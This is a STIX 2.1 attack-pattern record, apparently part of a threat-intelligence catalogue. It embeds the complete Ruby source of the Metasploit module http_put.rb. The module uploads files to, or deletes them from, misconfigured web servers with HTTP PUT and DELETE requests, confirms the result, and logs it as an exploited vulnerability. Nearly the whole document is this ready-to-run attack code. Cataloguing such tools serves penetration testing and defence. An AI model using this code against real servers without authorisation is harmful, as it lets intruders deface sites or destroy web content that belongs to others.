{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cfa7a243-a616-4806-a5fc-bf48fd673111",
    "created": "2024-08-14T16:31:00.911655Z",
    "modified": "2024-08-14T16:31:00.911659Z",
    "name": "HTTP Writable Path PUT/DELETE File Access",
    "description": " This module can abuse misconfigured web servers to upload and delete web content via PUT and DELETE HTTP requests. Set ACTION to either PUT or DELETE.  PUT is the default.  If filename isn't specified, the module will generate a random string for you as a .txt file. If DELETE is used, a filename is required. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/http_put.rb",
            "external_id": "http_put.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::WmapScanDir\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'        => 'HTTP Writable Path PUT/DELETE File Access',\n      'Description'    => %q{\n        This module can abuse misconfigured web servers to upload and delete web content\n        via PUT and DELETE HTTP requests. Set ACTION to either PUT or DELETE.\n\n        PUT is the default.  If filename isn't specified, the module will generate a\n        random string for you as a .txt file. If DELETE is used, a filename is required.\n      },\n      'Author'      =>\n        [\n          'Kashif [at] compulife.com.pk',\n          'CG',\n          'sinn3r',\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n      [\n        [ 'OSVDB', '397'],\n      ],\n      'Actions'     =>\n        [\n          ['PUT', 'Description' => 'Upload local file'],\n          ['DELETE', 'Description' => 'Delete remote file']\n        ],\n      'DefaultAction' => 'PUT'\n    )\n\n    register_options(\n      [\n        OptString.new('PATH', [true,  \"The path to attempt to write or delete\", \"/\"]),\n        OptString.new('FILENAME', [true,  \"The file to attempt to write or delete\", \"msf_http_put_test.txt\"]),\n        OptString.new('FILEDATA', [false, \"The data to upload into the file\", \"msf test file\"]),\n        OptString.new('ACTION', [true, \"PUT or DELETE\", \"PUT\"])\n      ])\n  end\n\n  #\n  # Send a normal HTTP request and see if we successfully uploaded or deleted a file.\n  # If successful, return true, otherwise false.\n  #\n  def file_exists(path, data, ip)\n    begin\n      res = send_request_cgi(\n        {\n          'uri'    => path,\n          'method' => 'GET',\n          'ctype'  => 'text/plain',\n          'data'   => data,\n        }, 20\n      ).to_s\n    rescue ::Exception => e\n      print_error(\"#{ip}: Error: #{e.to_s}\")\n      return nil\n    end\n\n    return (res =~ /#{data}/) ? true : false\n  end\n\n  #\n  # Do a PUT request to the server.  Function returns the HTTP response.\n  #\n  def do_put(path, data, ip)\n    begin\n      res = send_request_cgi(\n        {\n          'uri'    => normalize_uri(path),\n          'method' => 'PUT',\n          'ctype'  => 'text/plain',\n          'data'   => data,\n        }, 20\n      )\n    rescue ::Exception => e\n      print_error(\"#{ip}: Error: #{e.to_s}\")\n      return nil\n    end\n\n    return res\n  end\n\n  #\n  # Do a DELETE request. Function returns the HTTP response.\n  #\n  def do_delete(path, ip)\n    begin\n      res = send_request_cgi(\n        {\n          'uri'    => normalize_uri(path),\n          'method' => 'DELETE',\n          'ctype'  => 'text/html',\n        }, 20\n      )\n    rescue ::Exception => e\n      print_error(\"#{ip}: Error: #{e.to_s}\")\n      return nil\n    end\n\n    return res\n  end\n\n  #\n  # Main function for the module, duh!\n  #\n  def run_host(ip)\n    path   = datastore['PATH']\n    data   = datastore['FILEDATA']\n\n    if path[-1,1] != '/'\n      path += '/'\n    end\n\n    path += datastore['FILENAME']\n\n    case action.name\n    when 'PUT'\n      # Append filename if there isn't one\n      if path !~ /(.+\\.\\w+)$/\n        path << \"#{Rex::Text.rand_text_alpha(5)}.txt\"\n        vprint_status(\"No filename specified. Using: #{path}\")\n      end\n\n      # Upload file\n      res = do_put(path, data, ip)\n      vprint_status(\"#{ip}: Reply: #{res.code.to_s}\") if not res.nil?\n\n      # Check file\n      if not res.nil? and file_exists(path, data, ip)\n        turl = \"#{(ssl ? 'https' : 'http')}://#{ip}:#{rport}#{path}\"\n        print_good(\"File uploaded: #{turl}\")\n        report_vuln(\n          :host         => ip,\n          :port         => rport,\n          :proto        => 'tcp',\n          :name         => self.name,\n          :info         => \"Module #{self.fullname} confirmed write access to #{turl} via PUT\",\n          :refs         => self.references,\n          :exploited_at => Time.now.utc\n        )\n      else\n        print_error(\"#{ip}: File doesn't seem to exist. The upload probably failed\")\n      end\n\n    when 'DELETE'\n      # Check file before deleting\n      if path !~ /(.+\\.\\w+)$/\n        print_error(\"You must supply a filename\")\n        return\n      elsif not file_exists(path, data, ip)\n        print_error(\"File is already gone. Will not continue DELETE\")\n        return\n      end\n\n      # Delete our file\n      res = do_delete(path, ip)\n      vprint_status(\"#{ip}: Reply: #{res.code.to_s}\") if not res.nil?\n\n      # Check if DELETE was successful\n      if res.nil? or file_exists(path, data, ip)\n        print_error(\"#{ip}: DELETE failed. File is still there.\")\n      else\n        turl = \"#{(ssl ? 'https' : 'http')}://#{ip}:#{rport}#{path}\"\n        print_good(\"File deleted: #{turl}\")\n        report_vuln(\n          :host         => ip,\n          :port         => rport,\n          :proto        => 'tcp',\n          :sname => (ssl ? 'https' : 'http'),\n          :name         => self.name,\n          :info         => \"Module #{self.fullname} confirmed write access to #{turl} via DELETE\",\n          :refs         => self.references,\n          :exploited_at => Time.now.utc\n        )\n      end\n    end\n  end\nend\n"
}